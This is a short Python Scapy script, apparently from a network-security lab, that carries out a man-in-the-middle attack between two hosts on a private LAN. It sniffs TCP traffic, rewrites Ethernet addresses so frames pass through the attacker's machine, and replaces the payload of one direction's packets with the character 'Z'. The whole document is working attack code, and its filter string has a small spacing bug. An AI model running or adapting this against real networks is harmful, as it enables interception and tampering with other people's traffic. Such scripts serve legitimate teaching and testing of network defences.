from scapy.all import *
import re

# Machine A's informaton
IP_A  = "192.168.60.1"
MAC_A = "02:42:33:76:f0:81"

# Machine B's informaton
IP_B  = "192.168.60.2"
MAC_B = "02:42:c0:a8:3c:02"

# Attacker Machine's informaton
IP_M  = "192.168.60.3"
MAC_M = "02:42:c0:a8:3c:03"


print("LAUNCHING MITM ATTACK.......")

def spoof_pkt(pkt):
        print("Original Packet.......")
        print("Source IP:", pkt[IP].src)
        print("Destination IP:", pkt[IP].dst)
        if pkt[Ether].src == MAC_B and pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
                newdata = 'Z'
                pkt.src = MAC_M
                pkt.dst = MAC_A
                del(pkt.chksum)
                del(pkt[TCP].payload)
                del(pkt[TCP].chksum)
                pkt = pkt/newdata
                sendp(pkt)

        elif pkt[Ether].src == MAC_A and pkt[Ether].dst == MAC_B:
                pkt[Ether].src = MAC_M
                pkt[Ether].dst = MAC_B
                del(pkt.chksum)
                del(pkt[TCP].chksum)
                sendp(pkt)
        print("Spoofed Packet.......")
        print("Source IP:", pkt[IP].src)
        print("Destination IP:", pkt[IP].dst)


fi1ter='tcp and (ether src host ' + MAC_A + 'or ether src host ' + MAC_B + ')'
pkt=sniff(filter=fi1ter, prn=spoof_pkt, iface='eth0')

